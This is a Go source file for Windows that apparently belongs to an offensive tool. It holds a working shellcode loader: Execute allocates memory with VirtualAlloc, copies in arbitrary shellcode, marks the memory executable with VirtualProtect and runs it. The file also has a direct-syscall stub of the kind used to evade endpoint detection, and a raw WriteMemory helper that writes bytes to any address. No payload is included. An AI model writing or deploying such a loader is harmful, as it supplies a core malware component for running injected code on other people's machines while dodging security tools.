package core

import (
  "fmt"
  "unsafe"
  "syscall"

  "golang.org/x/sys/windows"
)

// Receives function address and arguments
func Syscall(callid uint16, argh ...uintptr) (errcode uint32, err error) {
  errcode = bpSyscall(callid, argh...)

  if errcode != 0 {
    err = fmt.Errorf("non-zero return from syscall")
  }
	
  return errcode, err
}

func bpSyscall(callid uint16, argh ...uintptr) (errcode uint32)

func Execute(shellcode []byte) (error) {
  kernel32 := windows.NewLazySystemDLL("kernel32.dll")
  ntdll := windows.NewLazySystemDLL("ntdll.dll")

  VirtualAlloc := kernel32.NewProc("VirtualAlloc")
  VirtualProtect := kernel32.NewProc("VirtualProtect")
  RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")

  // Allocate memory
  addr, _, errVirtualAlloc := VirtualAlloc.Call(
    0,
    uintptr(len(shellcode)),
    windows.MEM_COMMIT | windows.MEM_RESERVE,
    windows.PAGE_READWRITE,
  )

  if errVirtualAlloc != nil {
    return fmt.Errorf("Error calling VirtualAlloc: %s", errVirtualAlloc.Error())
  }

  if (addr == 0) {
    return fmt.Errorf("VirtualAlloc failed and returned 0")
  }

  _, _, errRtlCopyMemory := RtlCopyMemory.Call(
    addr,
    (uintptr)(unsafe.Pointer(&shellcode[0])),
    uintptr(len(shellcode)),
  )

  if errRtlCopyMemory != nil {
    return fmt.Errorf("Error calling RtlCopyMemory: %s", errRtlCopyMemory.Error())
  }

  oldProtect := windows.PAGE_READWRITE
  // Protect memory
  _, _, errVirtualProtect := VirtualProtect.Call(
    addr,
    uintptr(len(shellcode)),
    windows.PAGE_EXECUTE_READ,
    uintptr(unsafe.Pointer(&oldProtect)),
  )

  if errVirtualProtect != nil {
    return fmt.Errorf("Error calling VirtualProtect: %s", errVirtualProtect.Error())
  }

  // Execute shellcode
  _, _, errSyscall := syscall.Syscall(
    addr,
    0,
    0,
    0,
    0,
  )
  
  if errSyscall != 0 {
    return fmt.Errorf("Error executing shellcode syscall: %s", errSyscall.Error())
  }

  return nil
}

func WriteMemory(inbuf []byte, destination uintptr) {
  for index := uint32(0); index < uint32(len(inbuf)); index++ {
    writePtr := unsafe.Pointer(destination + uintptr(index))
    v := (*byte)(writePtr)
    *v = inbuf[index]
  }
}

